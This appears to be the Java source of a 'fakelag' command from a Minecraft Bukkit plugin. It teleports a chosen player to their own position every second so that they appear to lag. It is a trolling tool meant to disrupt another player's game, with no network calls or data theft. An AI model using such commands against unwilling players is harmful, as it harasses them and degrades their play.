package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.util.ArrayList;
import java.util.UUID;

public class FakeLag implements Command {
    private final ArrayList<UUID> lagging = new ArrayList<>();

    @Override
    public String[] getCommands() {
        return new String[]{"fakelag"};
    }

    @Override
    public String getDescription() {
        return "Teleports a player to themselves every second.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "fakelag <player>");
            return;
        }

        Player found = Bukkit.getPlayer(args[0]);
        if (found == null) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "That player was not found!");
            return;
        }

        UUID uuid = found.getUniqueId();

        if (lagging.contains(uuid)) {
            lagging.remove(uuid);
            sender.sendMessage(Colors.Prefix + Colors.Failure + found.getName() + " is no longer lagging!");
            return;
        }

        lagging.add(uuid);
        sender.sendMessage(Colors.Prefix + Colors.Success + found.getName() + " is now lagging!");
    }

    @Override
    public void onEnable(Z_ z) {
        Bukkit.getScheduler().scheduleSyncRepeatingTask(z, this::everySecond, 0, 20);
    }

    private void everySecond() {
        for (UUID uuid : lagging) {
            Player player = Bukkit.getPlayer(uuid);
            if (player == null) {
                continue;
            }

            player.teleport(player.getLocation());
        }
    }
}
